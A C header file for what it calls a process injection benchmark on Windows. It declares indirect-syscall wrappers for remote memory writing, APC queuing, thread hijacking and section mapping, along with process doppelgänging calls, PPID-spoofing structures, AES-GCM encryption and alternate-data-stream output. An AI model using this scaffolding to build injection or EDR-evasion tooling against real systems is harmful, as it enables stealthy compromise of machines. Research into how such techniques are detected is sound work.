// common.h — Shared types & NT API definitions for Process Injection Benchmark
#pragma once
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <winternl.h>
#include <wincrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

// ─── NT API helpers ───
#ifndef STATUS_PROCEDURE_NOT_FOUND
#define STATUS_PROCEDURE_NOT_FOUND ((NTSTATUS)0xC000007A)
#endif
#ifndef STATUS_BUFFER_TOO_SMALL
#define STATUS_BUFFER_TOO_SMALL       ((NTSTATUS)0xC0000023L)
#endif
#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_CASE_INSENSITIVE 0x00000040L
#endif

// ─── Crypto declarations ───
void sha256(const BYTE* data, SIZE_T len, BYTE* hash);
void aes256_gcm_encrypt(const BYTE* key, const BYTE* nonce, const BYTE* plaintext, SIZE_T len, BYTE* ciphertext, BYTE* tag);
void aes256_gcm_decrypt(const BYTE* key, const BYTE* nonce, const BYTE* ciphertext, SIZE_T len, const BYTE* tag, BYTE* plaintext);

// ─── ADS output ───
BOOL WriteToAds(PWSTR targetFile, PWSTR adsName, PBYTE data, SIZE_T size);

// ─── Indirect syscalls ───
typedef struct _SYSCALL_ENTRY { PWSTR name; DWORD syscallNumber; PVOID stubAddress; } SYSCALL_ENTRY;
BOOL InitSyscallResolver(void);

// Core injection syscalls
NTSTATUS SysNtOpenProcess(HANDLE* h, ACCESS_MASK a, POBJECT_ATTRIBUTES oa, CLIENT_ID* cid);
NTSTATUS SysNtAllocateVirtualMemory(HANDLE h, PVOID* ba, ULONG_PTR zb, PSIZE_T sz, ULONG at, ULONG prot);
NTSTATUS SysNtWriteVirtualMemory(HANDLE h, PVOID ba, PVOID buf, SIZE_T sz, PSIZE_T r);
NTSTATUS SysNtProtectVirtualMemory(HANDLE h, PVOID* ba, PSIZE_T sz, ULONG np, PULONG op);
NTSTATUS SysNtReadVirtualMemory(HANDLE h, PVOID ba, PVOID buf, SIZE_T sz, PSIZE_T r);
NTSTATUS SysNtQueryVirtualMemory(HANDLE h, PVOID ba, ULONG ic, PVOID mbi, SIZE_T sz, PSIZE_T r);
NTSTATUS SysNtQuerySystemInformation(ULONG ic, PVOID buf, ULONG sz, PULONG r);
NTSTATUS SysNtClose(HANDLE h);
NTSTATUS SysNtFreeVirtualMemory(HANDLE h, PVOID* ba, PSIZE_T sz, ULONG ft);

// Injection-specific
NTSTATUS SysNtCreateUserProcess(PHANDLE phProc, PHANDLE phThread, ACCESS_MASK pa, ACCESS_MASK ta,
    POBJECT_ATTRIBUTES poa, POBJECT_ATTRIBUTES toa, ULONG flags, ULONG threadFlags,
    PVOID params, PVOID createInfo, PVOID attrList);
NTSTATUS SysNtQueueApcThread(HANDLE hThread, PVOID ApcRoutine, PVOID arg1, PVOID arg2, PVOID arg3);
NTSTATUS SysNtResumeThread(HANDLE hThread, PULONG prevCount);
NTSTATUS SysNtGetContextThread(HANDLE hThread, PCONTEXT ctx);
NTSTATUS SysNtSetContextThread(HANDLE hThread, PCONTEXT ctx);
NTSTATUS SysNtCreateSection(PHANDLE hSec, ACCESS_MASK a, POBJECT_ATTRIBUTES oa, PLARGE_INTEGER sz,
    ULONG prot, ULONG allocAttrib, HANDLE hFile);
NTSTATUS SysNtMapViewOfSection(HANDLE hSec, HANDLE hProc, PVOID* ba, ULONG_PTR zb, SIZE_T cs,
    PLARGE_INTEGER so, PSIZE_T vs, DWORD inherit, ULONG at, ULONG prot);
NTSTATUS SysNtUnmapViewOfSection(HANDLE hProc, PVOID ba);

// Doppelgänging-specific (TxF)
NTSTATUS SysNtCreateTransaction(PHANDLE hTx, ACCESS_MASK a, POBJECT_ATTRIBUTES oa, LPGUID guid,
    HANDLE hRm, DWORD createOpt, DWORD timeout, DWORD descLen, PVOID desc);
NTSTATUS SysNtCreateFile(PHANDLE hFile, ACCESS_MASK a, POBJECT_ATTRIBUTES oa, PIO_STATUS_BLOCK iosb,
    PLARGE_INTEGER allocSz, ULONG fa, ULONG share, ULONG disp, ULONG createOpt, PVOID eaBuf, ULONG eaLen,
    HANDLE hTx);
NTSTATUS SysNtWriteFile(HANDLE hFile, HANDLE hEvent, PVOID apcRoutine, PVOID apcCtx,
    PIO_STATUS_BLOCK iosb, PVOID buf, ULONG len, PLARGE_INTEGER off, PULONG key);
NTSTATUS SysNtRollbackTransaction(HANDLE hTx, BOOL wait);
NTSTATUS SysNtCreateProcessEx(PHANDLE hProc, ACCESS_MASK a, POBJECT_ATTRIBUTES oa,
    HANDLE parentProc, ULONG flags, HANDLE hSec, HANDLE hDbg, HANDLE hExcept, DWORD procId);
NTSTATUS SysNtCreateThreadEx(PHANDLE hThread, ACCESS_MASK a, POBJECT_ATTRIBUTES oa,
    HANDLE hProc, PVOID entry, PVOID param, ULONG flags, ULONG_PTR zb, SIZE_T ss,
    SIZE_T cs, PVOID attrList);

// ─── Process creation flags ───
#ifndef PROCESS_CREATE_FLAGS_CREATE_SUSPENDED
#define PROCESS_CREATE_FLAGS_CREATE_SUSPENDED  0x00000001
#endif
#ifndef PROCESS_CREATE_FLAGS_BREAKAWAY
#define PROCESS_CREATE_FLAGS_BREAKAWAY         0x00000002
#endif

// ─── PS_ATTRIBUTE structures (for PPID spoofing) ───
#define PS_ATTRIBUTE_PARENT_PROCESS 0x20000L
#define PS_ATTRIBUTE_IMAGE_NAME     0x20002L

typedef struct _PS_ATTRIBUTE {
    ULONG_PTR Attribute;
    SIZE_T    Size;
    union {
        ULONG_PTR Value;
        PVOID     ValuePtr;
    };
    PSIZE_T    ReturnLength;
} PS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST {
    SIZE_T       TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST;

// ─── Process info for NtCreateUserProcess ───
typedef struct _PROCESS_CREATE_INFO {
    SIZE_T Size;
    ULONG  State;
    HANDLE hProcess;
    HANDLE hThread;
    CLIENT_ID ClientId;
    ULONG_PTR SectionBaseAddress;
    ULONG_PTR UserProcessParms;
    ULONG_PTR Reserved2;
    HANDLE    hFile;
} PROCESS_CREATE_INFO;

// ─── RTL_USER_PROCESS_PARAMETERS (minimal) ───
typedef struct _RTL_USER_PROCESS_PARAMETERS_EX {
    ULONG MaximumLength;
    ULONG Length;
    ULONG Flags;
    ULONG DebugFlags;
    PVOID  ConsoleHandle;
    ULONG ConsoleFlags;
    PVOID  StandardInput;
    PVOID  StandardOutput;
    PVOID  StandardError;
    // ... more fields but we only need the header
} RTL_USER_PROCESS_PARAMETERS_EX;

// ─── Utility ───
static DWORD FindProcessPid(PWSTR name) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD pid = 0;
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return pid;
}

// NtCurrentProcess macro (returns pseudo-handle for current process)
#ifndef NtCurrentProcess
#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
#endif

// RtlInitUnicodeString helper (dynamically resolved or inline)
static void MyRtlInitUnicodeString(PUNICODE_STRING us, PCWSTR src) {
    if (src) {
        SIZE_T len = wcslen(src) * sizeof(WCHAR);
        us->Length = (USHORT)min(len, 0xFFFE);
        us->MaximumLength = (USHORT)(len + sizeof(WCHAR));
        us->Buffer = (PWSTR)src;
    } else {
        us->Length = 0;
        us->MaximumLength = 0;
        us->Buffer = NULL;
    }
}
